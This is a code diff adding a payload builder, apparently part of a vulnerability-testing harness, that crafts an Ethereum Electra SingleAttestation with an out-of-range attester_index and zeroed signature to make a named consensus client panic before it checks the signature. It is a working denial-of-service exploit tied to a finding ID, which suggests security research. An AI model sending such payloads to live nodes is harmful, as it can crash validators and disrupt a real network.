@@ -162,6 +162,64 @@ def build_far_future_blocks(count: int, current_slot: int = 1000, slot_offset: i
     )
 
 
+# --- p2p-gossip: SingleAttestation OOB attester_index (CHK-QW-02) ------------
+#
+# Electra SingleAttestation SSZ layout (consensus-specs):
+#   { attester_index: ValidatorIndex (u64),
+#     data: AttestationData,
+#     signature: BLSSignature (96 bytes) }
+# AttestationData:
+#   { slot: Slot (u64), index: CommitteeIndex (u64),
+#     beacon_block_root: Root (32),
+#     source: Checkpoint { epoch: u64, root: 32 },
+#     target: Checkpoint { epoch: u64, root: 32 } }
+# Total fixed: 8 + (8+8+32+8+32+8+32) + 96 = 8 + 128 + 96 = 232 bytes
+
+ATTESTATION_DATA_SIZE = 128  # slot(8) + index(8) + root(32) + source(8+32) + target(8+32)
+SINGLE_ATTESTATION_SIZE = 8 + ATTESTATION_DATA_SIZE + 96  # 232
+
+
+def build_singleattestation_oob(
+    *,
+    attester_index: int = 0xFFFFFFFF,
+    slot: int = 0,
+    committee_index: int = 0,
+    beacon_block_root: bytes = b"\x00" * 32,
+    source_epoch: int = 0,
+    source_root: bytes = b"\x00" * 32,
+    target_epoch: int = 0,
+    target_root: bytes = b"\x00" * 32,
+) -> Payload:
+    """A SingleAttestation with an out-of-band attester_index.
+
+    The attester_index is set to a value that exceeds the justified state's
+    validator registry length (the "post-justified-checkpoint validator" from
+    the finding), so the victim's unguarded ``justified_active_balances[index]``
+    panics with an out-of-bounds access. The signature is zeroed — grandine
+    validates the BLS signature *after* the fork-choice mutator indexes the
+    array, so the panic fires before the invalid signature is rejected.
+    """
+    data = (
+        _uint64_le(slot)
+        + _uint64_le(committee_index)
+        + beacon_block_root
+        + _uint64_le(source_epoch) + source_root
+        + _uint64_le(target_epoch) + target_root
+    )
+    assert len(data) == ATTESTATION_DATA_SIZE
+    signature = b"\x00" * 96
+    msg = _uint64_le(attester_index) + data + signature
+    assert len(msg) == SINGLE_ATTESTATION_SIZE
+    return Payload(
+        generator="singleattestation_oob_attester_index",
+        count=1,
+        sent_bytes=len(msg),
+        victim_cost_bytes=len(msg),  # the cost is a panic, not heap growth
+        artifact=msg,
+        unique_count=1,
+    )
+
+
 # generator name -> builder(params) -> Payload
 def build_payload(generator: str, params: dict) -> Payload:
     if generator == "oversized_frame_body_length":
@@ -180,4 +238,10 @@ def build_payload(generator: str, params: dict) -> Payload:
         # cap constructed blocks for a unit test; the real flood repeats this.
         n = min(int(params.get("count", 1000)), 1000)
         return build_far_future_blocks(n, slot_offset=int(params.get("slot_offset", 1_000_000)))
+    if generator == "singleattestation_oob_attester_index":
+        return build_singleattestation_oob(
+            attester_index=int(params.get("attester_index", 0xFFFFFFFF)),
+            slot=int(params.get("slot", 0)),
+            committee_index=int(params.get("committee_index", 0)),
+        )
     raise KeyError(f"no payload builder for generator {generator!r}")
